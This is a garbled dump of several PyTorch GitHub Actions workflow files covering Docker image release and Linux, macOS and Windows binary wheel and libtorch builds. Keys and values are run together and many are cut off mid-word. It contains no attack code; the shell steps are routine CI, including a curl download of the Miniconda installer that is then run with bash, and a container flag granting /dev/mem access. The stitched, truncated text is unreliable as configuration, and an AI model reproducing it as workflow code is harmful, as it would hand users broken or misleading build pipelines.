name: T ...  bucketdocker-cache:name: d ... e-mi300/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__docker-release.ymlBuild Official Docker ImagesBuild O ...  Imagesdocker.Makefile.github/workflows/docker-release.yml.github/scripts/generate_docker_release_matrix.py.github ... trix.py- Dockerfilenightly- nightlyciflow/nightly/*BUILD_PROGRESSplainofficialDOCKER_ORGNO_BUILD_SUFFIXUSE_BUILDX${{ github.event_name == 'push' && (github.event.ref == 'refs/heads/nightly' || startsWith(github.event.ref, 'refs/tags/v')) }}BUILD_P ... : plain${{ needs.get-label-type.outputs.label-type }}linux.large"${{ ne ... .large"${{ steps.generate-matrix.outputs.matrix }}Get docker release matrixGet doc ...  matrixMATRIX_BLOB="$(python3 .github/scripts/generate_docker_release_matrix.py)"
echo "${MATRIX_BLOB}"
echo "matrix=${MATRIX_BLOB}" >> "${GITHUB_OUTPUT}"
${{ (github.ref == 'refs/heads/nightly' || startsWith(github.event.ref, 'refs/tags/v')) && 'docker-build' || '' }}- generate-matrix${{ fromJson(needs.generate-matrix.outputs.matrix) }}BUILD_IMAGE_TYPE${{ matrix.image_type }}BUILD_PLATFORMS${{ matrix.platform }}${{ mat ... form }}${{ matrix.cuda_full_version }}CUDA_VERSION_SHORT${{ matrix.cuda }}CUDNN_VERSION${{ matrix.cudnn_version }}BUILD_I ... type }}${{ env.WITH_PUSH == 'true' }}docker/login-action@74a5d142397b4f367a81961eba4e8cd7edddf772docker/ ... dddf772QEMU_BINARY_PATH${{ runner.temp }}/bin${{ run ...  }}/binQEMU_BI ...  }}/bindriver-optsimage=moby/buildkit:v0.19.0image=m ... v0.19.0Setup job specific variablesSetup j ... riablesset -eou pipefail
# To get QEMU binaries in our PATH
echo "${RUNNER_TEMP}/bin" >> "${GITHUB_PATH}"
# Generate PyTorch version to use
{
  echo "PYTORCH_VERSION=$(python3 .github/scripts/generate_pytorch_version.py --no-build-suffix)";
  echo "STABLE_CUDA_VERSION=$(python3 .github/scripts/get_ci_variable.py --stable-cuda-version)"
} >> "${GITHUB_ENV}"
Setup test specific variablesSetup t ... riablesif [[ ${{ github.event.ref }} =~ ^refs/tags/v[0-9]+\.[0-9]+\.[0-9]+-rc[0-9]+$ ]]; then
  {
    echo "DOCKER_IMAGE=pytorch-test";
    echo "INSTALL_CHANNEL=whl/test";
    echo "TRITON_VERSION=$(cut -f 1 .ci/docker/triton_version.txt)";
  } >> "${GITHUB_ENV}"
fi
Setup nightly specific variablesSetup n ... riables${{ github.event.ref == 'refs/heads/nightly' || startsWith(github.event.ref, 'refs/tags/ciflow/nightly/') }}${{ git ... y/') }}{
  echo "DOCKER_IMAGE=pytorch-nightly";
  echo "INSTALL_CHANNEL=whl/nightly";
  echo "TRITON_VERSION=$(cut -f 1 .ci/docker/triton_version.txt)+$(cut -c -10 .ci/docker/ci_commit_pins/triton.txt)";
} >> "${GITHUB_ENV}"
Run docker build / pushRun doc ...  / pushmake -f docker.Makefile "${BUILD_IMAGE_TYPE}-image"
name: R ...  / pushPush nightly tags${{ github.event.ref == 'refs/heads/nightly' && matrix.image_type == 'runtime' && matrix.build_platforms == 'linux/amd4' }}${{ git ... md4' }}PYTORCH_DOCKER_TAG="${PYTORCH_VERSION}-cuda${CUDA_VERSION_SHORT}-cudnn${CUDNN_VERSION}-runtime"
CUDA_SUFFIX="-cu${CUDA_VERSION}"
PYTORCH_NIGHTLY_COMMIT=$(docker run ghcr.io/pytorch/pytorch-nightly:"${PYTORCH_DOCKER_TAG}" \
                                python -c 'import torch; print(torch.version.git_version[:7],end="")')

docker tag ghcr.io/pytorch/pytorch-nightly:"${PYTORCH_DOCKER_TAG}" \
       ghcr.io/pytorch/pytorch-nightly:"${PYTORCH_NIGHTLY_COMMIT}${CUDA_SUFFIX}"

docker push ghcr.io/pytorch/pytorch-nightly:"${PYTORCH_NIGHTLY_COMMIT}${CUDA_SUFFIX}"

# Please note, here we ned to pin specific verison of CUDA as with latest label
if [[ ${CUDA_VERSION_SHORT} == "${STABLE_CUDA_VERSION}" ]]; then
  docker tag ghcr.io/pytorch/pytorch-nightly:"${PYTORCH_NIGHTLY_COMMIT}${CUDA_SUFFIX}" \
          ghcr.io/pytorch/pytorch-nightly:latest
  docker push ghcr.io/pytorch/pytorch-nightly:latest
fi
name: P ... ly tagsvalidatepytorch/test-infra/.github/workflows/validate-docker-images.yml@mainchannel: nightlyneeds: buildname: B ...  Images/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-linux-aarch64-binary-manywheel-nightly.ymllinux-aarch64-binary-manywheellinux-a ... nywheelciflow/binaries/*'ciflow/binaries/*'ciflow/binaries_wheel/*'ciflow ... heel/*'arm64v8/alpine"arm64v8/alpine"ALPINE_ ... alpine"linux-aarch64-binary-manywheel-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}linux-a ... tch' }}manywheel-py3_9-cpu-aarch64-buildmanywhe ... 4-build${{ github.repository_owner == 'pytorch' }}./.github/workflows/_binary-build-linux.yml./.gith ... nux.ymlmanylin ... builderFalse${{ needs.get-label-type.outputs.label-type }}"${{ ne ... ype }}"linux.arm64.m7g.4xlarge.ephemerallinux.a ... hemeralmanywheel-py3_9-cpu-aarch64manywhe ... aarch64manywheel-py3_9-cpu-aarch64-testmanywhe ... 64-test- manyw ... 4-build./.github/workflows/_binary-test-linux.ymllinux.arm64.2xlargemanywheel-py3_9-cpu-aarch64-uploadmanywhe ... -upload./.github/workflows/_binary-upload.yml./.gith ... oad.ymlmanywheel-py3_9-cuda-aarch64-12_8-buildmanywhe ... 8-buildcu12812.8-aarch64cuda-aarch64manywheel-py3_9-cuda-aarch64-12_8manywhe ... 64-12_8nvidia-cuda-nvrtc-cu12==12.8.61; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cuda-runtime-cu12==12.8.57; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cuda-cupti-cu12==12.8.57; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cudnn-cu12==9.8.0.87; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cublas-cu12==12.8.3.14; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cufft-cu12==11.3.3.41; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-curand-cu12==10.3.9.55; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusolver-cu12==11.7.2.55; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusparse-cu12==12.5.7.53; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusparselt-cu12==0.6.3; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nccl-cu12==2.26.5; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nvtx-cu12==12.8.55; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nvjitlink-cu12==12.8.61; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cufile-cu12==1.13.0.11; platform_system == 'Linux' and platform_machine == 'x86_64'nvidia- ... x86_64'420manywheel-py3_9-cuda-aarch64-12_8-uploadmanywheel-py3_10-cpu-aarch64-buildmanywheel-py3_10-cpu-aarch64manywheel-py3_10-cpu-aarch64-testmanywheel-py3_10-cpu-aarch64-uploadmanywheel-py3_10-cuda-aarch64-12_8-buildmanywheel-py3_10-cuda-aarch64-12_8manywheel-py3_10-cuda-aarch64-12_8-uploadmanywheel-py3_11-cpu-aarch64-buildmanywheel-py3_11-cpu-aarch64manywheel-py3_11-cpu-aarch64-testmanywheel-py3_11-cpu-aarch64-uploadmanywheel-py3_11-cuda-aarch64-12_8-buildmanywheel-py3_11-cuda-aarch64-12_8manywheel-py3_11-cuda-aarch64-12_8-uploadmanywheel-py3_12-cpu-aarch64-buildmanywheel-py3_12-cpu-aarch64manywheel-py3_12-cpu-aarch64-testmanywheel-py3_12-cpu-aarch64-uploadmanywheel-py3_12-cuda-aarch64-12_8-buildmanywheel-py3_12-cuda-aarch64-12_8manywheel-py3_12-cuda-aarch64-12_8-uploadmanywheel-py3_13-cpu-aarch64-buildmanywheel-py3_13-cpu-aarch64manywheel-py3_13-cpu-aarch64-testmanywheel-py3_13-cpu-aarch64-uploadmanywheel-py3_13-cuda-aarch64-12_8-buildmanywheel-py3_13-cuda-aarch64-12_8manywheel-py3_13-cuda-aarch64-12_8-uploadmanywheel-py3_13t-cpu-aarch64-buildmanywheel-py3_13t-cpu-aarch64manywheel-py3_13t-cpu-aarch64-testmanywheel-py3_13t-cpu-aarch64-uploadmanywheel-py3_13t-cuda-aarch64-12_8-buildmanywheel-py3_13t-cuda-aarch64-12_8manywheel-py3_13t-cuda-aarch64-12_8-uploadname: l ... nywheel/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-linux-binary-libtorch-nightly.ymllinux-binary-libtorchlinux-b ... ibtorchciflow/binaries_libtorch/*'ciflow ... orch/*'linux-binary-libtorch-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}linux-b ... tch' }}libtorch-cpu-shared-with-deps-release-buildlibtorc ... e-buildshared-with-depslibtorch-cpu-shared-with-deps-releaselibtorc ... releaselibtorch-cpu-shared-with-deps-release-testlibtorc ... se-test- libto ... e-buildlinux.4xlargelibtorch-cpu-shared-with-deps-release-uploadlibtorc ... -uploadlibtorch-cuda11_8-shared-with-deps-release-buildcu11811.8libtorch-cuda11_8-shared-with-deps-releaselibtorch-cuda11_8-shared-with-deps-release-testlinux.4xlarge.nvidia.gpulinux.4 ... dia.gpulibtorch-cuda11_8-shared-with-deps-release-uploadlibtorch-cuda12_6-shared-with-deps-release-buildcu12612.6libtorch-cuda12_6-shared-with-deps-releaselibtorch-cuda12_6-shared-with-deps-release-testlibtorch-cuda12_6-shared-with-deps-release-uploadlibtorch-cuda12_8-shared-with-deps-release-build12.8libtorch-cuda12_8-shared-with-deps-releaselibtorch-cuda12_8-shared-with-deps-release-testlinux.g4dn.4xlarge.nvidia.gpulinux.g ... dia.gpulibtorch-cuda12_8-shared-with-deps-release-uploadlibtorch-rocm6_3-shared-with-deps-release-build6.3libtorch-rocm6_3-shared-with-deps-releaselibtorch-rocm6_3-shared-with-deps-release-testlinux.rocm.gpuactions/download-artifact@v4.1.7actions ... @v4.1.7name: l ... releaseuses: a ... @v4.1.7ROCm set GPU_FLAGecho "GPU_FLAG=--device=/dev/mem --device=/dev/kfd --device=/dev/dri --group-add video --group-add daemon" >> "${GITHUB_ENV}"
name: R ... PU_FLAG${{ startsWith(github.event.ref, 'refs/tags/ciflow/') }}${{ sta ... w/') }}aws-actions/configure-aws-credentials@v4aws-act ... ials@v4- name: Setup ROCmlibtorch-rocm6_3-shared-with-deps-release-uploadlibtorch-rocm6_4-shared-with-deps-release-buildlibtorch-rocm6_4-shared-with-deps-releaselibtorch-rocm6_4-shared-with-deps-release-testlibtorch-rocm6_4-shared-with-deps-release-uploadname: l ... ibtorch/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-linux-binary-libtorch-release-main.ymllinux-binary-libtorch-releaselinux-b ... releaseciflow/trunk/*'ciflow/trunk/*'- 'ciflow/trunk/*'linux-binary-libtorch-release-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-linux-binary-manywheel-main.ymllinux-binary-manywheellinux-b ... nywheellinux-binary-manywheel-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}manywheel-py3_9-cuda11_8-buildmanywheel-py3_9-cuda11_8manywhe ... uda11_8nvidia-cuda-nvrtc-cu11==11.8.89; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cuda-runtime-cu11==11.8.89; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cuda-cupti-cu11==11.8.87; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cudnn-cu11==9.1.0.70; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cublas-cu11==11.11.3.6; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cufft-cu11==10.9.0.58; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-curand-cu11==10.3.0.86; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusolver-cu11==11.4.1.48; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusparse-cu11==11.7.5.86; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nccl-cu11==2.21.5; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nvtx-cu11==11.8.86; platform_system == 'Linux' and platform_machine == 'x86_64'manywheel-py3_9-cuda11_8-testmanywhe ... _8-test- manyw ... 8-buildmanywheel-py3_9-cuda12_6-buildmanywhe ... 6-buildmanywheel-py3_9-cuda12_6manywhe ... uda12_6nvidia-cuda-nvrtc-cu12==12.6.77; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cuda-runtime-cu12==12.6.77; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cuda-cupti-cu12==12.6.80; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cudnn-cu12==9.5.1.17; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cublas-cu12==12.6.4.1; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cufft-cu12==11.3.0.4; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-curand-cu12==10.3.7.77; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusolver-cu12==11.7.1.2; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusparse-cu12==12.5.4.2; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cusparselt-cu12==0.6.3; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nccl-cu12==2.26.5; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nvtx-cu12==12.6.77; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-nvjitlink-cu12==12.6.85; platform_system == 'Linux' and platform_machine == 'x86_64' | nvidia-cufile-cu12==1.11.1.6; platform_system == 'Linux' and platform_machine == 'x86_64'manywheel-py3_9-cuda12_6-testmanywhe ... _6-test- manyw ... 6-buildmanywheel-py3_9-cuda12_8-buildmanywheel-py3_9-cuda12_8manywhe ... uda12_8manywheel-py3_9-cuda12_8-test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-linux-binary-manywheel-nightly.ymlmanywheel-py3_9-cpu-buildmanywhe ... u-buildmanywheel-py3_9-cpumanywheel-py3_9-cpu-testmanywhe ... pu-test- manyw ... u-buildmanywheel-py3_9-cpu-uploadmanywheel-py3_9-cuda11_8-uploadmanywheel-py3_9-cuda12_6-uploadmanywheel-py3_9-cuda12_8-uploadmanywheel-py3_9-rocm6_3-buildmanywhe ... 3-buildmanywheel-py3_9-rocm6_3manywhe ... rocm6_3manywheel-py3_9-rocm6_3-testmanywhe ... _3-test- manyw ... 3-buildname: m ... rocm6_3manywheel-py3_9-rocm6_3-uploadmanywheel-py3_9-rocm6_4-buildmanywheel-py3_9-rocm6_4manywhe ... rocm6_4manywheel-py3_9-rocm6_4-testmanywhe ... _4-testname: m ... rocm6_4manywheel-py3_9-rocm6_4-uploadmanywheel-py3_9-xpu-buildmanywheel-py3_9-xpuintel-cmplr-lib-rt==2025.1.1 | intel-cmplr-lib-ur==2025.1.1 | intel-cmplr-lic-rt==2025.1.1 | intel-sycl-rt==2025.1.1 | oneccl-devel==2021.15.1; platform_system == 'Linux' and platform_machine == 'x86_64' | oneccl==2021.15.1; platform_system == 'Linux' and platform_machine == 'x86_64' | impi-rt==2021.15.0; platform_system == 'Linux' and platform_machine == 'x86_64' | onemkl-sycl-blas==2025.1.0 | onemkl-sycl-dft==2025.1.0 | onemkl-sycl-lapack==2025.1.0 | onemkl-sycl-rng==2025.1.0 | onemkl-sycl-sparse==2025.1.0 | dpcpp-cpp-rt==2025.1.1 | intel-opencl-rt==2025.1.1 | mkl==2025.1.0 | intel-openmp==2025.1.1 | tbb==2022.1.0 | tcmlib==1.3.0 | umf==0.10.0 | intel-pti==0.12.0intel-c ... =0.12.0manywheel-py3_9-xpu-testlinux.idc.xpuaws-actions/amazon-ecr-login@v2aws-act ... ogin@v2name: m ... 3_9-xpu- name: Setup XPUmanywheel-py3_9-xpu-uploadmanywheel-py3_10-cpu-buildmanywheel-py3_10-cpumanywheel-py3_10-cpu-testmanywheel-py3_10-cpu-uploadmanywheel-py3_10-cuda11_8-buildmanywheel-py3_10-cuda11_8manywheel-py3_10-cuda11_8-testmanywheel-py3_10-cuda11_8-uploadmanywheel-py3_10-cuda12_6-buildmanywheel-py3_10-cuda12_6manywheel-py3_10-cuda12_6-testmanywheel-py3_10-cuda12_6-uploadmanywheel-py3_10-cuda12_8-buildmanywheel-py3_10-cuda12_8manywheel-py3_10-cuda12_8-testmanywheel-py3_10-cuda12_8-uploadmanywheel-py3_10-rocm6_3-buildmanywheel-py3_10-rocm6_3manywheel-py3_10-rocm6_3-testmanywheel-py3_10-rocm6_3-uploadmanywheel-py3_10-rocm6_4-buildmanywheel-py3_10-rocm6_4manywheel-py3_10-rocm6_4-testmanywheel-py3_10-rocm6_4-uploadmanywheel-py3_10-xpu-buildmanywheel-py3_10-xpumanywheel-py3_10-xpu-testname: m ... _10-xpumanywheel-py3_10-xpu-uploadmanywheel-py3_11-cpu-buildmanywheel-py3_11-cpumanywheel-py3_11-cpu-testmanywheel-py3_11-cpu-uploadmanywheel-py3_11-cuda11_8-buildmanywheel-py3_11-cuda11_8manywheel-py3_11-cuda11_8-testmanywheel-py3_11-cuda11_8-uploadmanywheel-py3_11-cuda12_6-buildmanywheel-py3_11-cuda12_6manywheel-py3_11-cuda12_6-testmanywheel-py3_11-cuda12_6-uploadmanywheel-py3_11-cuda12_6-full-buildmanywhe ... l-buildmanywheel-py3_11-cuda12_6-fullmanywhe ... _6-fullmanywheel-py3_11-cuda12_6-full-testmanywhe ... ll-test- manyw ... l-buildmanywheel-py3_11-cuda12_6-full-uploadmanywheel-py3_11-cuda12_8-buildmanywheel-py3_11-cuda12_8manywheel-py3_11-cuda12_8-testmanywheel-py3_11-cuda12_8-uploadmanywheel-py3_11-rocm6_3-buildmanywheel-py3_11-rocm6_3manywheel-py3_11-rocm6_3-testmanywheel-py3_11-rocm6_3-uploadmanywheel-py3_11-rocm6_4-buildmanywheel-py3_11-rocm6_4manywheel-py3_11-rocm6_4-testmanywheel-py3_11-rocm6_4-uploadmanywheel-py3_11-xpu-buildmanywheel-py3_11-xpumanywheel-py3_11-xpu-testname: m ... _11-xpumanywheel-py3_11-xpu-uploadmanywheel-py3_12-cpu-buildmanywheel-py3_12-cpumanywheel-py3_12-cpu-testmanywheel-py3_12-cpu-uploadmanywheel-py3_12-cuda11_8-buildmanywheel-py3_12-cuda11_8manywheel-py3_12-cuda11_8-testmanywheel-py3_12-cuda11_8-uploadmanywheel-py3_12-cuda12_6-buildmanywheel-py3_12-cuda12_6manywheel-py3_12-cuda12_6-testmanywheel-py3_12-cuda12_6-uploadmanywheel-py3_12-cuda12_8-buildmanywheel-py3_12-cuda12_8manywheel-py3_12-cuda12_8-testmanywheel-py3_12-cuda12_8-uploadmanywheel-py3_12-rocm6_3-buildmanywheel-py3_12-rocm6_3manywheel-py3_12-rocm6_3-testmanywheel-py3_12-rocm6_3-uploadmanywheel-py3_12-rocm6_4-buildmanywheel-py3_12-rocm6_4manywheel-py3_12-rocm6_4-testmanywheel-py3_12-rocm6_4-uploadmanywheel-py3_12-xpu-buildmanywheel-py3_12-xpumanywheel-py3_12-xpu-testname: m ... _12-xpumanywheel-py3_12-xpu-uploadmanywheel-py3_13-cpu-buildmanywheel-py3_13-cpumanywheel-py3_13-cpu-testmanywheel-py3_13-cpu-uploadmanywheel-py3_13-cuda11_8-buildmanywheel-py3_13-cuda11_8manywheel-py3_13-cuda11_8-testmanywheel-py3_13-cuda11_8-uploadmanywheel-py3_13-cuda12_6-buildmanywheel-py3_13-cuda12_6manywheel-py3_13-cuda12_6-testmanywheel-py3_13-cuda12_6-uploadmanywheel-py3_13-cuda12_8-buildmanywheel-py3_13-cuda12_8manywheel-py3_13-cuda12_8-testmanywheel-py3_13-cuda12_8-uploadmanywheel-py3_13-rocm6_3-buildmanywheel-py3_13-rocm6_3manywheel-py3_13-rocm6_3-testmanywheel-py3_13-rocm6_3-uploadmanywheel-py3_13-rocm6_4-buildmanywheel-py3_13-rocm6_4manywheel-py3_13-rocm6_4-testmanywheel-py3_13-rocm6_4-uploadmanywheel-py3_13-xpu-buildmanywheel-py3_13-xpumanywheel-py3_13-xpu-testname: m ... _13-xpumanywheel-py3_13-xpu-uploadmanywheel-py3_13t-cpu-buildmanywheel-py3_13t-cpumanywhe ... 13t-cpumanywheel-py3_13t-cpu-testmanywheel-py3_13t-cpu-uploadmanywheel-py3_13t-cuda11_8-buildmanywheel-py3_13t-cuda11_8manywheel-py3_13t-cuda11_8-testmanywheel-py3_13t-cuda11_8-uploadmanywheel-py3_13t-cuda12_6-buildmanywheel-py3_13t-cuda12_6manywheel-py3_13t-cuda12_6-testmanywheel-py3_13t-cuda12_6-uploadmanywheel-py3_13t-cuda12_8-buildmanywheel-py3_13t-cuda12_8manywheel-py3_13t-cuda12_8-testmanywheel-py3_13t-cuda12_8-uploadmanywheel-py3_13t-rocm6_3-buildmanywheel-py3_13t-rocm6_3manywheel-py3_13t-rocm6_3-testmanywheel-py3_13t-rocm6_3-uploadmanywheel-py3_13t-rocm6_4-buildmanywheel-py3_13t-rocm6_4manywheel-py3_13t-rocm6_4-testmanywheel-py3_13t-rocm6_4-uploadmanywheel-py3_13t-xpu-buildmanywheel-py3_13t-xpumanywhe ... 13t-xpumanywheel-py3_13t-xpu-testname: m ... 13t-xpumanywheel-py3_13t-xpu-upload/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-linux-s390x-binary-manywheel-nightly.ymllinux-s390x-binary-manywheellinux-s ... nywheeldocker.io/s390x/alpine"docker ... alpine"linux-s390x-binary-manywheel-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}linux-s ... tch' }}manywheel-py3_9-cpu-s390x-buildmanywhe ... x-buildcpu-s390xpytorch/manylinuxs390x-builderpytorch ... buildermanywheel-py3_9-cpu-s390xmanywhe ... u-s390xmanywheel-py3_9-cpu-s390x-testmanywhe ... 0x-test- manyw ... x-buildmanywheel-py3_9-cpu-s390x-uploadmanywheel-py3_10-cpu-s390x-buildmanywheel-py3_10-cpu-s390xmanywheel-py3_10-cpu-s390x-testmanywheel-py3_10-cpu-s390x-uploadmanywheel-py3_11-cpu-s390x-buildmanywheel-py3_11-cpu-s390xmanywheel-py3_11-cpu-s390x-testmanywheel-py3_11-cpu-s390x-uploadmanywheel-py3_12-cpu-s390x-buildmanywheel-py3_12-cpu-s390xmanywheel-py3_12-cpu-s390x-testmanywheel-py3_12-cpu-s390x-uploadmanywheel-py3_13-cpu-s390x-buildmanywheel-py3_13-cpu-s390xmanywheel-py3_13-cpu-s390x-testmanywheel-py3_13-cpu-s390x-upload/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-macos-arm64-binary-libtorch-release-nightly.ymlmacos-arm64-binary-libtorch-releasemacos-a ... releasemacos-arm64-binary-libtorch-release-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}macos-a ... tch' }}${{ github.workspace }}/pytorch${{ git ... pytorchPopulate binary env# shellcheck disable=SC2129
echo "BINARY_ENV_FILE=${RUNNER_TEMP}/env" >> "${GITHUB_ENV}"
# shellcheck disable=SC2129
echo "PYTORCH_FINAL_PACKAGE_DIR=${RUNNER_TEMP}/artifacts" >> "${GITHUB_ENV}"
# shellcheck disable=SC2129
echo "MAC_PACKAGE_WORK_DIR=${RUNNER_TEMP}" >> "${GITHUB_ENV}"
name: P ... ary envInstall conda and dependencies# Install conda, setup-miniconda messes with the path that messes with the ruby stuff we do later on
curl --retry 3 --retry-all-errors -o "${RUNNER_TEMP}/conda.sh" "https://repo.anaconda.com/miniconda/Miniconda3-py310_23.5.2-0-MacOSX-$(uname -m).sh"
chmod +x "${RUNNER_TEMP}/conda.sh"
/bin/bash "${RUNNER_TEMP}/conda.sh" -b -p "${RUNNER_TEMP}/anaconda"
echo "${RUNNER_TEMP}/anaconda/bin" >> "${GITHUB_PATH}"
if [ -d "/Applications/Xcode_14.3.1.app" ]; then
  echo "DEVELOPER_DIR=/Applications/Xcode_14.3.1.app/Contents/Developer" >> "${GITHUB_ENV}"
elif [ -d "/Applications/Xcode_13.3.1.app" ]; then
  echo "DEVELOPER_DIR=/Applications/Xcode_13.3.1.app/Contents/Developer" >> "${GITHUB_ENV}"
fi
# shellcheck disable=SC1091
source "${RUNNER_TEMP}/anaconda/bin/activate"
"${PYTORCH_ROOT}/.circleci/scripts/binary_populate_env.sh"
# shellcheck disable=SC1091
source "${RUNNER_TEMP}/anaconda/bin/activate"
set -eux -o pipefail
# shellcheck disable=SC1090
source "${BINARY_ENV_FILE:-/Users/distiller/project/env}"
mkdir -p "$PYTORCH_FINAL_PACKAGE_DIR"

# Build
USE_PYTORCH_METAL_EXPORT=1
USE_COREML_DELEGATE=1
TORCH_PACKAGE_NAME="${TORCH_PACKAGE_NAME//-/_}"
export USE_PYTORCH_METAL_EXPORT
export USE_COREML_DELEGATE
export TORCH_PACKAGE_NAME
"${PYTORCH_ROOT}/.ci/wheel/build_wheel.sh"
actions/upload-artifact@v4.4.0actions ... @v4.4.0${{ env.PYTORCH_FINAL_PACKAGE_DIR }}"${{ en ... DIR }}"uses: a ... @v4.4.0- name: ... ary envlibtorc ... -build:name: m ... release/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-macos-arm64-binary-wheel-nightly.ymlmacos-arm64-binary-wheelmacos-a ... y-wheelmacos-arm64-binary-wheel-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}wheel-py3_9-cpu-buildwheel-p ... u-buildTest PyTorch wheel# shellcheck disable=SC1091
source "${RUNNER_TEMP}/anaconda/bin/activate"
set -eux -o pipefail
# shellcheck disable=SC1090
source "${BINARY_ENV_FILE:-/Users/distiller/project/env}"
pip uninstall -y "$TORCH_PACKAGE_NAME" || true
pip uninstall -y "$TORCH_PACKAGE_NAME" || true

# Create new "clean" conda environment for testing

SMOKE_TEST_PARAMS=""
if [[ $DESIRED_PYTHON == "3.13t" ]]; then
  conda create -yn "test_conda_env" python="3.13" python-freethreading -c conda-forge
  SMOKE_TEST_PARAMS="--torch-compile-check disabled"
else
  conda create -yn "test_conda_env" python="$DESIRED_PYTHON"
fi
conda activate test_conda_env
pip install "$PYTORCH_FINAL_PACKAGE_DIR"/*.whl numpy -v

# shellcheck disable=SC2086
python "${PYTORCH_ROOT}/.ci/pytorch/smoke_test/smoke_test.py" --package torchonly ${SMOKE_TEST_PARAMS}
name: T ... h wheelwheel-py3_9-cpuname: w ... 3_9-cpuwheel-py3_9-cpu-uploadwheel-p ... -uploadwheel-py3_10-cpu-buildwheel-py3_10-cpuname: w ... _10-cpuwheel-py3_10-cpu-uploadwheel-py3_11-cpu-buildwheel-py3_11-cpuname: w ... _11-cpuwheel-py3_11-cpu-uploadwheel-py3_12-cpu-buildwheel-py3_12-cpuname: w ... _12-cpuwheel-py3_12-cpu-uploadwheel-py3_13-cpu-buildwheel-py3_13-cpuname: w ... _13-cpuwheel-py3_13-cpu-uploadwheel-py3_13t-cpu-buildwheel-py3_13t-cpuname: w ... 13t-cpuwheel-py3_13t-cpu-uploadwheel-p ... -build:name: m ... y-wheel/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-arm64-binary-libtorch-debug-nightly.ymlwindows-arm64-binary-libtorch-debugwindows ... h-debugOSDOWNLOADS_DIRc:\temp\downloadsDEPENDENCIES_DIRc:\temp\dependenciesENABLE_APLENABLE_OPENBLASMSVC_VERSION14.42windows-arm64-binary-libtorch-debug-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}windows ... tch' }}libtorch-cpu-shared-with-deps-debug-buildlibtorc ... g-buildwindows-11-arm64-preview"window ... review"echo BINARY_ENV_FILE=%RUNNER_TEMP%/env>> %GITHUB_ENV%
echo PYTORCH_FINAL_PACKAGE_DIR=%RUNNER_TEMP%/artifacts>> %GITHUB_ENV%
echo WIN_PACKAGE_WORK_DIR=%RUNNER_TEMP%>> %GITHUB_ENV%
Bootstrap foldersmkdir "%NIGHTLIES_PYTORCH_ROOT%"
mkdir "%PYTORCH_FINAL_PACKAGE_DIR%"
name: B ... foldersEnable long pathsgit config --system --get core.longpaths || echo "core.longpaths is not set, setting it now"
git config --system core.longpaths true
name: E ... g pathsGit checkout PyTorch"pytorch"path: "pytorch"name: G ... PyTorchBootstrap Python"pytorch/.ci/pytorch/windows/arm64/bootstrap_python.bat"
name: B ...  PythonBootstrap APL"pytorch/.ci/pytorch/windows/arm64/bootstrap_apl.bat"
name: Bootstrap APLBootstrap Rust"pytorch/.ci/pytorch/windows/arm64/bootstrap_rust.bat"
name: Bootstrap RustBootstrap sccache"pytorch/.ci/pytorch/windows/arm64/bootstrap_sccache.bat"
